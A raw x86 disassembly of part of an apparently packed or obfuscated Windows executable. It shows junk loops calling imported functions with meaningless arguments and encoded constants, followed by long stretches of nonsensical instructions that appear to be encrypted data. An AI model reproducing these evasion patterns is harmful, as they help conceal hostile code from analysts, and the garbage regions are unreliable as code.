  40384f:	cmp    DWORD PTR [eax],edi
  403851:	je     0x402858
  403857:	mov    eax,0x800f1c9a
  40385c:	jmp    0x4028b7
  403861:	push   ebp
  403862:	mov    ebp,esp
  403864:	sub    esp,0x44
  403867:	push   edi
  403868:	mov    eax,DWORD PTR [ebp+0xc]
  40386b:	and    DWORD PTR ds:0x4304a6,0x265f
  403875:	mov    DWORD PTR [ebp-0x10],eax
  403878:	mov    eax,DWORD PTR [ebp+0x8]
  40387b:	and    DWORD PTR ds:0x42e766,0x0
  403885:	jmp    0x403899
  40388a:	xor    ecx,ecx
  40388c:	or     ecx,DWORD PTR ds:0x42e766
  403892:	inc    ecx
  403893:	mov    DWORD PTR ds:0x42e766,ecx
  403899:	cmp    DWORD PTR ds:0x42e766,0x12
  4038a0:	jae    0x4038db
  4038a6:	cmp    DWORD PTR ds:0x42e766,0x5
  4038ad:	jne    0x4038bc
  4038b3:	push   DWORD PTR [ebp-0x14]
  4038b6:	call   DWORD PTR ds:0x42e9dc
  4038bc:	cmp    DWORD PTR ds:0x42e766,0x4
  4038c3:	jne    0x4038d6
  4038c9:	mov    ecx,DWORD PTR ds:0x42e766
  4038cf:	inc    ecx
  4038d0:	mov    DWORD PTR ds:0x42e766,ecx
  4038d6:	jmp    0x40388a
  4038db:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4038e2:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  4038e9:	mov    edx,DWORD PTR [ebp+0x8]
  4038ec:	and    DWORD PTR ds:0x42ee28,0x0
  4038f6:	mov    edi,DWORD PTR ds:0x42ee28
  4038fc:	inc    edi
  4038fd:	mov    DWORD PTR ds:0x42ee28,edi
  403903:	cmp    DWORD PTR ds:0x42ee28,0x4
  40390a:	jne    0x403920
  403910:	push   0x1500
  403915:	push   0x3962
  40391a:	call   DWORD PTR ds:0x42e9f4
  403920:	cmp    DWORD PTR ds:0x42ee28,0x3
  403927:	jne    0x40393a
  40392d:	mov    edi,DWORD PTR ds:0x42ee28
  403933:	inc    edi
  403934:	mov    DWORD PTR ds:0x42ee28,edi
  40393a:	cmp    DWORD PTR ds:0x42ee28,0x18
  403941:	jb     0x4038f6
  403947:	and    DWORD PTR ds:0x42ee1c,0x0
  403951:	jmp    0x403963
  403956:	mov    ecx,DWORD PTR ds:0x42ee1c
  40395c:	inc    ecx
  40395d:	mov    DWORD PTR ds:0x42ee1c,ecx
  403963:	cmp    DWORD PTR ds:0x42ee1c,0x11
  40396a:	jae    0x4039ad
  403970:	cmp    DWORD PTR ds:0x42ee1c,0x4
  403977:	jne    0x403988
  40397d:	push   0x5572
  403982:	call   DWORD PTR ds:0x42eb9c
  403988:	cmp    DWORD PTR ds:0x42ee1c,0x3
  40398f:	jne    0x4039a2
  403995:	mov    ecx,DWORD PTR ds:0x42ee1c
  40399b:	inc    ecx
  40399c:	mov    DWORD PTR ds:0x42ee1c,ecx
  4039a2:	jmp    0x403956
  4039a7:	add    ecx,0x3d2b
  4039ad:	mov    DWORD PTR [ebp-0x40],eax
  4039b0:	xor    DWORD PTR ds:0x42ee14,ebx
  4039b6:	mov    eax,0x7510856
  4039bb:	xor    edx,eax
  4039bd:	mov    ecx,0x32729d
  4039c2:	or     edi,DWORD PTR ds:0x4304a6
  4039c8:	add    edx,ecx
  4039ca:	adc    DWORD PTR ds:0x43048e,ebx
  4039d0:	mov    DWORD PTR [ebp-0x8],edx
  4039d3:	mov    edx,DWORD PTR [ebp+0x8]
  4039d6:	mov    DWORD PTR ds:0x4304aa,0x1d
  4039e0:	cmp    DWORD PTR ds:0x4304aa,0x0
  4039e7:	je     0x403a1f
  4039ed:	cmp    DWORD PTR ds:0x4304aa,0x2c
  4039f4:	jne    0x403a03
  4039fa:	push   DWORD PTR [ebp-0x14]
  4039fd:	call   DWORD PTR ds:0x42e9e0
  403a03:	mov    edi,DWORD PTR ds:0x4304aa
  403a09:	dec    edi
  403a0a:	mov    DWORD PTR ds:0x4304aa,edi
  403a10:	jmp    0x4039e0
  403a15:	adc    DWORD PTR ds:0x42ee30,0x29f8
  403a1f:	xor    edx,eax
  403a21:	xor    edi,DWORD PTR ds:0x4304aa
  403a27:	add    edx,ecx
  403a29:	mov    DWORD PTR [ebp+0xc],edx
  403a2c:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  403a33:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403a3a:	mov    DWORD PTR [ebp-0x2c],0xf89c8530
  403a41:	and    DWORD PTR ds:0x43055a,0x0
  403a4b:	mov    edx,DWORD PTR ds:0x43055a
  403a51:	inc    edx
  403a52:	mov    DWORD PTR ds:0x43055a,edx
  403a58:	cmp    DWORD PTR ds:0x43055a,0x2b
  403a5f:	jne    0x403a77
  403a65:	push   0x85b9
  403a6a:	push   0x0
  403a6c:	push   0x24c3
  403a71:	call   DWORD PTR ds:0x42e9f8
  403a77:	cmp    DWORD PTR ds:0x43055a,0x1e
  403a7e:	jb     0x403a4b
  403a84:	adc    edi,0xfa7
  403a8a:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403a91:	or     edi,0x30ac
  403a97:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  403a9e:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  403aa5:	xor    DWORD PTR ds:0x430542,ebx
  403aab:	mov    DWORD PTR [ebp-0x3c],0xf89c853c
  403ab2:	mov    edx,DWORD PTR [ebp+0x8]
  403ab5:	xor    edx,eax
  403ab7:	mov    edi,DWORD PTR [ebp-0x10]
  403aba:	add    edx,ecx
  403abc:	cmp    edi,edx
  403abe:	mov    DWORD PTR ds:0x42e75a,0x7baa
  403ac8:	je     0x4052e2
  403ace:	mov    DWORD PTR ds:0x43054a,0x2abe
  403ad8:	push   ebx
  403ad9:	mov    DWORD PTR ds:0x43048a,0x536a
  403ae3:	jmp    0x4052bd
  403ae8:	mov    edi,DWORD PTR ds:0x430592
  403aee:	mov    edx,DWORD PTR ds:0x42e9b0
  403af4:	sub    edx,edi
  403af6:	or     edi,DWORD PTR [edi+edx*1]
  403af9:	mov    edx,DWORD PTR [ebp-0x8]
  403afc:	sub    DWORD PTR ds:0x4304b2,edx
  403b02:	mov    edi,DWORD PTR [ebp-0x10]
  403b05:	xor    DWORD PTR ds:0x42ee1c,0x6f7b
  403b0f:	sub    edi,edx
  403b11:	and    DWORD PTR ds:0x4304aa,0x0
  403b1b:	mov    edx,DWORD PTR ds:0x4304aa
  403b21:	inc    edx
  403b22:	mov    DWORD PTR ds:0x4304aa,edx
  403b28:	cmp    DWORD PTR ds:0x4304aa,0xa
  403b2f:	jne    0x403b43
  403b35:	push   DWORD PTR [ebp-0x20]
  403b38:	push   0x8b6b
  403b3d:	call   DWORD PTR ds:0x42eac0
  403b43:	cmp    DWORD PTR ds:0x4304aa,0x9
  403b4a:	jne    0x403b5d
  403b50:	mov    edx,DWORD PTR ds:0x4304aa
  403b56:	inc    edx
  403b57:	mov    DWORD PTR ds:0x4304aa,edx
  403b5d:	cmp    DWORD PTR ds:0x4304aa,0x14
  403b64:	jb     0x403b1b
  403b6a:	mov    DWORD PTR ds:0x430542,0x73d7
  403b74:	mov    edx,DWORD PTR [ebp-0x4]
  403b77:	and    DWORD PTR ds:0x430492,0x430552
  403b81:	xor    edx,eax
  403b83:	xor    DWORD PTR ds:0x43048e,0x6fac
  403b8d:	add    edx,ecx
  403b8f:	mov    DWORD PTR ds:0x43048a,0x698f
  403b99:	cmp    edi,edx
  403b9b:	mov    DWORD PTR ds:0x4304c2,0x4dce
  403ba5:	jb     0x4052e1
  403bab:	add    DWORD PTR ds:0x42ee20,0x380f
  403bb5:	mov    edx,DWORD PTR [ebp-0x28]
  403bb8:	add    edi,edi
  403bba:	mov    edi,DWORD PTR [ebp-0x4]
  403bbd:	xor    ebx,ebx
  403bbf:	add    ebx,DWORD PTR ds:0x42ee30
  403bc5:	and    ebx,DWORD PTR ds:0x430552
  403bcb:	mov    DWORD PTR ds:0x42ee30,ebx
  403bd1:	xor    edx,eax
  403bd3:	and    DWORD PTR ds:0x42e75a,0x0
  403bdd:	mov    ebx,DWORD PTR ds:0x42e75a
  403be3:	inc    ebx
  403be4:	mov    DWORD PTR ds:0x42e75a,ebx
  403bea:	cmp    DWORD PTR ds:0x42e75a,0x28
  403bf1:	jne    0x403c05
  403bf7:	push   DWORD PTR [ebp-0x10]
  403bfa:	push   0x85bf
  403bff:	call   DWORD PTR ds:0x42e9fc
  403c05:	cmp    DWORD PTR ds:0x42e75a,0x1d
  403c0c:	jb     0x403bdd
  403c12:	sbb    DWORD PTR ds:0x4304c2,0x42d2
  403c1c:	xor    edi,eax
  403c1e:	add    edi,ecx
  403c20:	mov    DWORD PTR ds:0x43048e,0x1a
  403c2a:	cmp    DWORD PTR ds:0x43048e,0x0
  403c31:	je     0x403c83
  403c37:	cmp    DWORD PTR ds:0x43048e,0xc
  403c3e:	jne    0x403c4d
  403c44:	push   DWORD PTR [ebp-0x18]
  403c47:	call   DWORD PTR ds:0x42ea00
  403c4d:	cmp    DWORD PTR ds:0x43048e,0xd
  403c54:	jne    0x403c67
  403c5a:	mov    ebx,DWORD PTR ds:0x43048e
  403c60:	dec    ebx
  403c61:	mov    DWORD PTR ds:0x43048e,ebx
  403c67:	mov    ebx,DWORD PTR ds:0x43048e
  403c6d:	dec    ebx
  403c6e:	mov    DWORD PTR ds:0x43048e,ebx
  403c74:	jmp    0x403c2a
  403c79:	sbb    DWORD PTR ds:0x43054e,0x12f8
  403c83:	add    edx,ecx
  403c85:	sbb    DWORD PTR ds:0x43054a,0x4304c2
  403c8f:	imul   edx,edi
  403c92:	xor    ebx,DWORD PTR ds:0x430486
  403c98:	mov    edi,DWORD PTR [ebp-0x8]
  403c9b:	add    ebx,DWORD PTR ds:0x43054a
  403ca1:	mov    ebx,DWORD PTR [ebp-0x10]
  403ca4:	sub    ebx,edi
  403ca6:	mov    DWORD PTR ds:0x42ee24,0x5446
  403cb0:	cmp    ebx,edx
  403cb2:	mov    DWORD PTR ds:0x43048a,0x67f
  403cbc:	ja     0x403cd8
  403cc2:	mov    edx,DWORD PTR [ebp-0x4]
  403cc5:	xor    edx,eax
  403cc7:	or     DWORD PTR ds:0x4304ae,0x5676
  403cd1:	add    edx,ecx
  403cd3:	jmp    0x404621
  403cd8:	mov    edx,DWORD PTR [ebp-0x2c]
  403cdb:	mov    edi,DWORD PTR [ebp-0x4]
  403cde:	xor    edx,eax
  403ce0:	xor    edi,eax
  403ce2:	mov    ebx,DWORD PTR ds:0x42e776
  403ce8:	adc    DWORD PTR ds:0x42ee10,ebx
  403cee:	add    edi,ecx
  403cf0:	add    edx,ecx
  403cf2:	imul   edx,edi
  403cf5:	mov    edi,DWORD PTR ds:0x4304aa
  403cfb:	sbb    DWORD PTR ds:0x42e76e,edi
  403d01:	mov    edi,DWORD PTR [ebp-0x8]
  403d04:	or     ebx,0x29ff
  403d0a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d0d:	sub    ebx,edi
  403d0f:	cmp    ebx,edx
  403d11:	ja     0x403ec9
  403d17:	jmp    0x403ec1
  403d1c:	jmp    0x6c13:0x697351b5
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	imul   esp,DWORD PTR [eax-0xbe6cd93],0xffffffc0
  403d2b:	shl    BYTE PTR [esi-0x748181ef],cl
  403d31:	jg     0x403db1
  403d33:	jle    0x403d22
  403d35:	mov    ah,0xaa
  403d37:	cdq    
  403d38:	in     eax,0xe4
  403d3a:	fnstenv es:[edi+0x38]
  403d3e:	xchg   esi,eax
  403d3f:	add    ch,cl
  403d41:	mul    BYTE PTR [edi-0x57fd3a9]
  403d47:	mov    ch,0xf1
  403d49:	xor    BYTE PTR [ebp+ebp*8+0x7d019c38],al
  403d50:	mov    dh,0x59
  403d52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d53:	mov    al,ds:0x9de04915
  403d58:	or     ebx,DWORD PTR [ebx-0x7d]
  403d5b:	push   ebx
  403d5c:	add    BYTE PTR [esi],0x5a
  403d5f:	lods   al,BYTE PTR ds:[esi]
  403d60:	push   es
  403d61:	ja     0x403d03
  403d63:	add    DWORD PTR [bx+di+0x562a],0x90f23618
  403d6c:	shl    DWORD PTR [edi-0x4b],cl
  403d6f:	call   0xff25:0x54ede981
  403d76:	int    0x1c
  403d78:	jl     0x403d98
  403d7a:	test   eax,0x7a7b0417
  403d7f:	addr16 mov cl,0xc
  403d82:	jae    0x403d06
  403d84:	hlt    
  403d85:	jns    0x403d1e
  403d87:	jb     0x403d79
  403d89:	aam    0x32
  403d8b:	aaa    
  403d8c:	sahf   
  403d8d:	push   cs
  403d8e:	stos   DWORD PTR es:[edi],eax
  403d8f:	mov    bl,0xa7
  403d91:	sbb    BYTE PTR [esi+eax*1+0x2b],dl
  403d95:	pop    esp
  403d96:	int3   
  403d97:	push   edx
  403d98:	mov    ss,esi
  403d9a:	retf   
  403d9b:	adc    ah,bh
  403d9d:	call   0xfc9:0x3d432d81
  403da4:	sbb    eax,0x6f0cbc14
  403da9:	enter  0xc39a,0xa3
  403dad:	aad    0x45
  403daf:	or     eax,0x36b3983d
  403db4:	xchg   edi,eax
  403db5:	sub    edi,DWORD PTR [ecx-0x63553649]
  403dbb:	jle    0x403de4
  403dbd:	jecxz  0x403d63
  403dbf:	cmp    ebp,esi
  403dc1:	sbb    esp,DWORD PTR [ecx]
  403dc3:	and    ch,BYTE PTR [ebx+0x17]
  403dc6:	fisttp QWORD PTR [ebp-0xd2c0e3f]
  403dcc:	std    
  403dcd:	std    
  403dce:	aas    
  403dcf:	push   edx
  403dd0:	aad    0x68
  403dd2:	pop    ss
  403dd3:	(bad)  
  403dd4:	push   ebp
  403dd5:	(bad)  
  403dd6:	test   BYTE PTR [ebx+0x1a44e5db],0x9c
  403ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403dde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ddf:	jne    0x403dfa
  403de1:	adc    edx,esi
  403de3:	mov    al,0x3a
  403de5:	jle    0x403e2e
  403de7:	out    0x5d,al
  403de9:	and    BYTE PTR [esi+0x42],0x36
  403ded:	inc    ecx
  403dee:	scas   eax,DWORD PTR es:[edi]
  403def:	dec    esp
  403df0:	fiadd  DWORD PTR [ecx+0x3b]
  403df3:	(bad)  
  403df4:	dec    esi
  403df5:	xchg   BYTE PTR [eax-0x7f],bl
  403df8:	div    DWORD PTR [ebp-0xae730dd]
  403dfe:	add    al,0x31
  403e00:	stc    
  403e01:	imul   ecx,DWORD PTR [eax],0xb950658b
  403e07:	add    BYTE PTR [edx-0x7524a858],0xce
  403e0e:	cdq    
  403e0f:	daa    
  403e10:	(bad)  
  403e11:	mov    al,0xa8
  403e13:	ds xor al,0x34
  403e16:	mov    eax,ecx
  403e18:	ds jnp 0x403e12
  403e1b:	xlat   BYTE PTR ds:[ebx]
  403e1c:	pop    ecx
  403e1d:	push   ss
  403e1e:	xor    eax,0x384464bf
  403e23:	sti    
  403e24:	rcl    BYTE PTR [edi-0x42],0x32
  403e28:	mov    eax,0x1543fff6
  403e2d:	push   cs
  403e2e:	rcr    BYTE PTR [edi-0x3765ff53],1
  403e34:	hlt    
  403e35:	add    dl,BYTE PTR [esi+0xf]
  403e38:	xchg   esp,eax
  403e39:	push   edi
  403e3a:	repnz shr DWORD PTR [ecx],0xc3
  403e3e:	neg    BYTE PTR [edx+0x452c5244]
  403e44:	in     al,0x41
  403e46:	sbb    al,0x33
  403e48:	sub    eax,0x68eeb153
  403e4d:	mov    ah,0xf2
  403e4f:	fxam   
  403e51:	out    dx,al
  403e52:	push   ebp
  403e53:	sbb    eax,0xf94f707f
  403e58:	ins    DWORD PTR es:[edi],dx
  403e59:	xchg   edx,eax
  403e5a:	sbb    BYTE PTR [ebx+eax*2+0xa],dl
  403e5e:	fisub  DWORD PTR [eax]
  403e60:	popf   
  403e61:	dec    esi
  403e62:	enter  0xbe6a,0xc2
  403e66:	mov    ds:0xcdd5e33e,eax
  403e6b:	popa   
  403e6c:	sbb    BYTE PTR [ebx+0x425feab8],0x52
  403e73:	ins    DWORD PTR es:[edi],dx
  403e74:	std    
  403e75:	jae    0x403e64
  403e77:	repz lahf 
  403e79:	int    0x3c
  403e7b:	arpl   WORD PTR [ebx+0x24878b99],bp
  403e81:	mov    DWORD PTR [ebp+0x5d],eax
  403e84:	mov    ah,BYTE PTR [ebx-0x65]
  403e87:	scas   eax,DWORD PTR es:[edi]
  403e88:	mov    ebx,0xa9bc6a9
  403e8d:	retf   
  403e8e:	or     al,0xf3
  403e90:	cmc    
  403e91:	xchg   ebx,eax
  403e92:	jne    0x403efe
  403e94:	jne    0x403ec2
  403e96:	mov    BYTE PTR [esi],ch
  403e98:	push   0xffffffd8
  403e9a:	push   ebx
  403e9b:	add    eax,0x2d58e978
  403ea0:	push   ss
  403ea1:	mov    ch,0x4d
  403ea3:	add    ah,bl
  403ea5:	pop    ebx
  403ea6:	inc    eax
  403ea7:	mov    edx,0xb3480b3e
  403eac:	mov    ebx,0x4cca12ac
  403eb1:	lods   al,BYTE PTR ds:[esi]
  403eb2:	push   esi
  403eb3:	in     al,dx
  403eb4:	(bad)  
  403eb5:	stc    
  403eb6:	add    eax,0x2fcc8c85
  403ebb:	add    dh,bl
  403ebd:	xchg   DWORD PTR [edi],eax
  403ebf:	scas   eax,DWORD PTR es:[edi]
  403ec0:	outs   dx,BYTE PTR ds:[esi]
  403ec1:	mov    edx,DWORD PTR [ebp-0x28]
  403ec4:	jmp    0x404613
  403ec9:	mov    edx,DWORD PTR [ebp-0x30]
  403ecc:	mov    edi,DWORD PTR [ebp-0x4]
  403ecf:	xor    edx,eax
  403ed1:	xor    edi,eax
  403ed3:	add    edi,ecx
  403ed5:	add    edx,ecx
  403ed7:	imul   edx,edi
  403eda:	mov    edi,DWORD PTR [ebp-0x8]
  403edd:	mov    ebx,DWORD PTR [ebp-0x10]
  403ee0:	sub    ebx,edi
  403ee2:	cmp    ebx,edx
  403ee4:	ja     0x40409c
  403eea:	jmp    0x404094
  403eef:	ror    BYTE PTR [ebx],cl
  403ef1:	push   edi
  403ef2:	mov    dh,0x57
  403ef4:	push   0xffffffd3
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	mov    ds:0x1e7278c4,al
  403efc:	fild   QWORD PTR [ecx-0x3]
  403eff:	ret    
  403f00:	adc    edi,DWORD PTR [esi+0x7e]
  403f03:	mov    edi,DWORD PTR [edi+0x7e]
  403f06:	jle    0x403f87
  403f08:	inc    ebp
  403f09:	mov    ebx,0xefa15984
  403f0e:	mov    edx,0xaee4d17c
  403f13:	rol    cl,1
  403f15:	outs   dx,BYTE PTR ds:[esi]
  403f16:	and    BYTE PTR [edx+0x16],ah
  403f19:	inc    eax
  403f1a:	lods   al,BYTE PTR ds:[esi]
  403f1b:	jmp    0xed03:0xa2cb6fb1
  403f22:	sbb    bh,BYTE PTR [ecx+0x59]
  403f25:	jecxz  0x403eee
  403f27:	cld    
  403f28:	sbb    al,BYTE PTR ds:0x13e314a6
  403f2e:	es dec ebx
  403f30:	push   esp
  403f31:	sar    BYTE PTR ds:0xae36a3fc,cl
  403f37:	retf   0x7ebe
  403f3a:	sbb    al,BYTE PTR [ebp+edi*2+0x74d45ce3]
  403f41:	imul   edi,ebx,0xffffffa3
  403f44:	push   ds
  403f45:	in     al,dx
  403f46:	mov    dh,0x41
  403f48:	out    0x67,eax
  403f4a:	ror    DWORD PTR [ecx+0x288e3e94],1
  403f50:	retf   
  403f51:	pop    ebp
  403f52:	out    dx,al
  403f53:	xchg   esp,eax
  403f54:	outs   dx,BYTE PTR ds:[esi]
  403f55:	jl     0x403f2e
  403f57:	(bad)  
  403f58:	jae    0x403fcb
  403f5a:	fwait
  403f5b:	jl     0x403f99
  403f5d:	cmp    DWORD PTR [esi],esi
  403f5f:	test   BYTE PTR [ebp+0x5e],0xd2
  403f63:	fdiv   QWORD PTR [ebx+0x531cf86]
  403f69:	add    DWORD PTR [edx-0x1ae89161],ecx
  403f6f:	lds    ebx,FWORD PTR [esi-0x3cae5ba8]
  403f75:	xlat   BYTE PTR ds:[ebx]
  403f76:	(bad)  
  403f77:	repz out dx,eax
  403f79:	int3   
  403f7a:	mov    edx,DWORD PTR [edi+ebx*1]
  403f7d:	test   ah,ch
  403f7f:	ja     0x403fd2
  403f81:	fstp   DWORD PTR [eax+0x51269c1]
  403f87:	std    
  403f88:	dec    edi
  403f89:	loopne 0x403fc8
  403f8b:	sub    BYTE PTR [eax+edx*4+0x3c],cl
  403f8f:	ja     0x403fc6
  403f91:	jo     0x403f9b
  403f93:	(bad)  
  403f94:	ror    DWORD PTR [edx-0x77],cl
  403f97:	popf   
  403f98:	mov    ch,0x48
  403f9a:	imul   eax,DWORD PTR [esp+ecx*4-0x9926cc9],0x7e
  403fa2:	pusha  
  403fa3:	fstp   TBYTE PTR [ebp+0x1d]
  403fa6:	sub    dl,cl
  403fa8:	push   ebx
  403fa9:	repnz mov WORD PTR [eax+0x7bab64a],ds
  403fb0:	push   ebp
  403fb1:	test   eax,0xf793b8fa
  403fb6:	fnstcw WORD PTR [ecx+0x34]
  403fb9:	retf   0x3938
  403fbc:	outs   dx,DWORD PTR ds:[esi]
  403fbd:	add    al,0xeb
  403fbf:	xchg   edi,eax
  403fc0:	and    eax,0x381e3983
  403fc5:	mov    al,ds:0x3ca7959a
  403fca:	adc    ecx,DWORD PTR [edi+0x7f]
  403fcd:	rcr    DWORD PTR [ebx+0x17],cl
  403fd0:	xchg   edx,eax
  403fd1:	add    DWORD PTR [edx],esi
  403fd3:	sar    DWORD PTR [ebx],1
  403fd5:	fldcw  WORD PTR [edi+esi*8+0x6c847ebd]
  403fdc:	dec    ecx
  403fdd:	jmp    0xfec:0x5731b17a
  403fe4:	clc    
  403fe5:	sub    BYTE PTR [eax+ecx*4],bl
  403fe8:	iret   
  403fe9:	das    
  403fea:	inc    edi
  403feb:	std    
  403fec:	pop    edx
  403fed:	inc    ebp
  403fee:	jle    0x403fea
  403ff0:	repz jae 0x403fdd
  403ff3:	dec    ebx
  403ff4:	sub    dh,BYTE PTR [edi-0x49f0dddf]
  403ffa:	add    BYTE PTR [edx],0x57
  403ffd:	shl    eax,0x7c
  404000:	jno    0x40404c
  404002:	inc    ebp
  404004:	pop    eax
  404005:	(bad)  
  404006:	nop
  404007:	stos   BYTE PTR es:[edi],al
  404008:	fidiv  DWORD PTR [esp+ebx*2]
  40400b:	shl    al,0x3f
  40400e:	sbb    BYTE PTR ds:0xda9e45b9,dh
  404014:	je     0x403fca
  404016:	sbb    BYTE PTR [eax+0x287e650c],bl
  40401c:	into   
  40401d:	mov    bl,0x27
  40401f:	sbb    edi,edi
  404021:	inc    esp
  404022:	xchg   esp,eax
  404023:	dec    ebx
  404024:	call   0xd83dbb74
  404029:	out    0x10,al
  40402b:	mov    es,WORD PTR [edx+ebp*1-0x2d]
  40402f:	loope  0x40407f
  404031:	dec    eax
  404032:	sti    
  404033:	pop    ss
  404034:	inc    eax
  404035:	add    eax,esi
  404037:	mov    ?,eax
  404039:	add    ecx,DWORD PTR [ecx+ebx*4-0x334a82b9]
  404040:	adc    eax,DWORD PTR [ebx+0x62]
  404043:	out    0x7f,eax
  404045:	pop    ebx
  404046:	int    0xa7
  404048:	mov    esp,0xec5c314b
  40404d:	repz xlat BYTE PTR ds:[ebx]
  40404f:	push   edx
  404050:	jmp    0x13626a07
  404055:	xor    edi,DWORD PTR [eax+0x5705f7b9]
  40405b:	sahf   
  40405c:	sub    eax,0x72c073ff
  404061:	inc    ebp
  404062:	cmp    BYTE PTR [edi+0x69],bh
  404065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404066:	test   ch,ch
  404068:	stos   DWORD PTR es:[edi],eax
  404069:	mov    cl,0x20
  40406b:	aad    0x93
  40406d:	xchg   DWORD PTR [eax+edx*1-0x42],eax
  404071:	ret    
  404072:	mov    gs,WORD PTR [edx+0x28bee26c]
  404078:	imul   ebp,ecx,0xffffffbc
  40407b:	push   cs
  40407c:	push   es
  40407d:	mov    edi,0x565a0fd1
  404082:	ins    DWORD PTR es:[edi],dx
  404083:	rol    DWORD PTR [eax+0x52b44a6c],cl
  404089:	dec    ebp
  40408a:	mov    ebp,0xd5e3be59
  40408f:	(bad)  
  404090:	aas    
  404091:	push   edx
  404092:	pop    ss
  404093:	inc    esi
  404094:	mov    edx,DWORD PTR [ebp-0x2c]
  404097:	jmp    0x404613
  40409c:	mov    edx,DWORD PTR [ebp-0x34]
  40409f:	mov    edi,DWORD PTR [ebp-0x4]
  4040a2:	jmp    0x40424c
  4040a7:	fs bswap eax
  4040aa:	popf   
  4040ab:	ins    DWORD PTR es:[edi],dx
  4040ac:	pop    ebp
  4040ad:	gs out 0x68,eax
  4040b0:	xchg   ebp,eax
  4040b1:	pop    DWORD PTR [eax+0x45c10b10]
  4040b7:	push   eax
  4040b8:	adc    al,0x7e
  4040ba:	jle    0x404047
  4040bc:	jg     0x40413c
  4040be:	jle    0x40405b
  4040c0:	pop    eax
  4040c1:	hlt    
  4040c2:	mov    cl,0x9c
  4040c4:	mov    WORD PTR [eax],?
  4040c6:	mov    ebx,0x3c136f28
  4040cb:	int3   
  4040cc:	dec    edi
  4040ce:	xchg   ecx,eax
  4040cf:	in     eax,0xf
  4040d1:	inc    ecx
  4040d2:	ss cmp eax,0x97e8d3ab
  4040d8:	rcr    BYTE PTR [ecx+0x7bdb177a],1
  4040de:	mov    ebx,0x2ce6a432
  4040e3:	nop
  4040e4:	pop    es
  4040e5:	loope  0x404076
  4040e7:	sub    al,0xba
  4040e9:	push   0xe821469
  4040ee:	mov    al,ds:0x402af25e
  4040f3:	inc    edi
  4040f4:	jl     0x4040bf
  4040f6:	in     eax,0xba
  4040f8:	(bad)  
  4040f9:	(bad)  
  4040fb:	add    bl,BYTE PTR [edi]
  4040fd:	add    bh,ch
  4040ff:	fs jp  0x4040bb
  404102:	data16 jecxz 0x40412e
  404105:	rcr    eax,cl
  404107:	retf   0xf74b
  40410a:	mov    es,WORD PTR [edx]
  40410c:	push   esi
  40410d:	or     DWORD PTR [ecx+eax*2-0x3e],ecx
  404111:	shr    BYTE PTR [eax],1
  404113:	push   ss
  404114:	dec    esp
  404115:	cwde   
  404116:	cmp    dl,BYTE PTR [ebx+0x43ea810d]
  40411c:	mov    al,ds:0xc55beaa9
  404121:	or     edi,esi
  404123:	dec    eax
  404124:	push   cs
  404125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404127:	add    ecx,0x11
  40412a:	push   0xa1c1cd8c
  40412f:	pop    ebp
  404130:	or     ecx,DWORD PTR [ecx]
  404132:	cmp    eax,0x8438e1bb
  404137:	sub    eax,0xe9d3dbac
  40413c:	pop    ds
  40413d:	loope  0x4041ba
  40413f:	jg     0x4041b8
  404141:	shl    DWORD PTR [ecx-0x71b24ca0],1
  404147:	xor    al,0xa3
  404149:	xchg   edi,eax
  40414a:	in     eax,dx
  40414b:	fist   DWORD PTR [edi+0x7001c04a]
  404151:	mov    esi,0x4c4ebc31
  404156:	sbb    DWORD PTR [edi-0x60],ebp
  404159:	mov    dh,0x5
  40415b:	(bad)
  40415e:	js     0x40417a
  404160:	xchg   edx,eax
  404161:	test   DWORD PTR [ebx+esi*8+0x24140e39],0xde23eefc
  40416c:	jno    0x4040fa
  40416e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40416f:	mov    dh,0x77
  404171:	cmp    DWORD PTR [edi-0xe0cdd31],ebx
  404177:	int    0x57
  404179:	push   ss
  40417a:	adc    DWORD PTR [esi+eax*8],esp
  40417d:	jb     0x4041d6
  40417f:	fs xchg ebx,eax
  404181:	daa    
  404182:	in     al,0x5d
  404184:	dec    esp
  404185:	or     DWORD PTR [eax-0x38937adb],eax
  40418b:	xor    esp,DWORD PTR ds:0xe9ef090d
  404191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404193:	adc    edi,ebp
  404195:	js     0x4041d0
  404197:	loope  0x4041c0
  404199:	retf   
  40419a:	cs add bl,cl
  40419d:	dec    ecx
  40419e:	pop    ebx
  40419f:	rcr    DWORD PTR [eax],1
  4041a1:	pop    esi
  4041a2:	xlat   BYTE PTR ds:[ebx]
  4041a3:	dec    edx
  4041a4:	lock fst DWORD PTR [edi+0x68]
  4041a8:	xlat   BYTE PTR ds:[ebx]
  4041a9:	loopne 0x404178
  4041ab:	bound  ebp,QWORD PTR [ecx+eiz*1-0x6d]
  4041af:	pcmpeqw mm1,QWORD PTR [esi-0x63548360]
  4041b6:	mov    DWORD PTR [ecx],0x4d16cbfc
  4041bc:	jge    0x404207
  4041be:	mov    dh,0xf7
  4041c0:	in     eax,dx
  4041c1:	in     eax,0x13
  4041c3:	sti    
  4041c4:	mov    al,ds:0xd664184f
  4041c9:	inc    eax
  4041ca:	xor    ebp,DWORD PTR ds:[eax+ebp*1+0x5c]
  4041cf:	test   al,0xec
  4041d1:	xor    edi,DWORD PTR es:[esi-0x38]
  4041d5:	fdivr  st(0),st
  4041d7:	jo     0x404187
  4041d9:	(bad)  
  4041da:	xchg   ebx,eax
  4041db:	and    ecx,DWORD PTR [edi+0x78]
  4041de:	mov    ebp,DWORD PTR [edx]
  4041e0:	int3   
  4041e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041e2:	sbb    ecx,DWORD PTR [edi+0x2f9a8e1e]
  4041e8:	xchg   DWORD PTR ds:0x18062b79,ebp
  4041ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
